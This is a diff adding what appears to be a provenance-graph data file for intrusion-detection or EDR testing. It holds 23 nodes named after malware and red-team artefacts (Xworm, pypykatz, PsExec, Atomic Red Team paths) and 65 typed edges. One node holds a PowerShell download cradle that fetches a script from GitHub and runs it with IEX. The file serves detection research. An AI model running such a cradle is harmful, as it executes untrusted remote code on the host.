@@ -1,0 +1,91 @@
+23
+MP*-ipconfig.exe
+MF-\Users\admin\AppData\Local\Temp\Heapman45.exe
+TF-\Users\admin\AppData\Roaming\mozilla.exe
+MP-pypykatz.py
+MP-powershell.exe 
+SO-test@poscoplantec.co
+TF-\Windows\system32\vssvc.exe
+MF-\Users\admin\AppData\Local\Temp\Normes_Entreprise.pdf
+TF-C:\Users\admin\AppData\Local\Temp\Xworm
+TP-ns9CE0.tmp
+SF-HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity
+TP*-ns9EC8.tmp 
+MP*-ns9F46.tmp
+TF-.\T1071.004\src\T1071-dns-domain-length.ps1
+MF-C:\Users\admin\AppData\Local\Temp\Invoice_No_17037
+MP*-WScript.exe
+SO-https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_
+MF-www.youtube.c
+MP-tasklist.exe
+TF-.\ExternalPayloads\T1003.004\bin\PsExec.exe
+MP-ExplorerSuite.tmp
+MP-vdsldr.exe
+TP-AcroRd32.exe 
+65
+0 1 RD
+0 2 WR
+0 3 FR
+3 1 WR
+3 2 WR
+0 4 FR
+4 1 WR
+4 2 RD
+3 4 UK
+0 5 ST
+0 6 WR
+0 7 RD
+0 8 WR
+0 9 FR
+9 1 WR
+9 2 EX
+5 9 RF
+9 6 RD
+9 7 RD
+9 8 WR
+0 10 EX
+9 10 WR
+11 1 EX
+11 2 WR
+5 11 RF
+11 6 WR
+11 7 RD
+11 8 WR
+9 11 IJ
+11 10 WR
+12 2 RD
+5 12 RF
+12 6 WR
+12 7 WR
+12 8 WR
+9 12 IJ
+12 10 WR
+11 12 UK
+9 13 RD
+9 14 RD
+15 5 ST
+15 6 WR
+15 7 RD
+15 8 RD
+9 15 IJ
+15 10 RD
+15 13 WR
+15 14 WR
+9 16 ST
+15 16 ST
+9 17 WR
+15 17 EX
+18 8 CD
+9 18 UK
+15 19 UK
+20 10 UK
+21 13 RD
+21 14 RD
+21 16 ST
+21 17 EX
+22 13 WR
+22 14 WR
+16 22 RF
+22 17 RD
+21 22 UK
+
